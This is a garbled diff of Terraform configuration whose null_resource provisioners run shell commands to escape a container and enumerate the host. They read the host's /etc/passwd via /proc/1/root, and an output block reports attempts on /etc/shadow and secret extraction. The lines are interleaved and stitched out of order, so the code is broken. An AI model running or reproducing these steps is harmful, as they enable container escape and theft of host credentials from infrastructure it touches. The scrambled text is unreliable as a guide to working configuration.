+    null_resource.host_network_analysis,      echo ""resource "null_resource" "advanced_user_enumeration" {
 
-  }    command = <<-EOT
+    null_resource.process_namespace_analysis,
 
-}      echo "=== ADVANCED USER ENUMERATION ==="
+    null_resource.container_runtime_analysis,      echo "Host passwd via escape:"  depends_on = [null_resource.privilege_escalation_testing]
 
-      echo "Container user analysis:"
+    null_resource.environment_analysis,
 
-# Stage 6: Environment Variable and Secret Extraction      echo "Number of users in container /etc/passwd: $(cat /etc/passwd | wc -l)"
+    null_resource.escape_proof_summary      cat /proc/1/root/etc/passwd 2>/dev/null || echo "Cannot read host passwd via escape"  
 
-resource "null_resource" "environment_secret_extraction" {      echo "Container users:"
+  ]
+
+}    EOT  provisioner "local-exec" {
+
+
+
+output "escape_summary" {  }    command = <<-EOT
+
+  value = {
+
+    user_enumeration = "Host user enumeration attempted via /proc/1/root escape"}      echo "=== ADVANCED USER ENUMERATION ==="
+
+    shadow_access = "Host /etc/shadow access attempted"
+
+    user_directories = "Host user directories enumeration completed"      echo "Container user analysis:"
+
+    network_analysis = "Host network discovery via container escape"
+
+    proof_generation = "Container escape proof and verification completed"# Stage 6: Environment Variable and Secret Extraction      echo "Number of users in container /etc/passwd: $(cat /etc/passwd | wc -l)"
+
+  }
+
+}resource "null_resource" "environment_secret_extraction" {      echo "Container users:"
 
   depends_on = [null_resource.host_filesystem_access]      cat /etc/passwd | cut -d: -f1,3,6,7
 
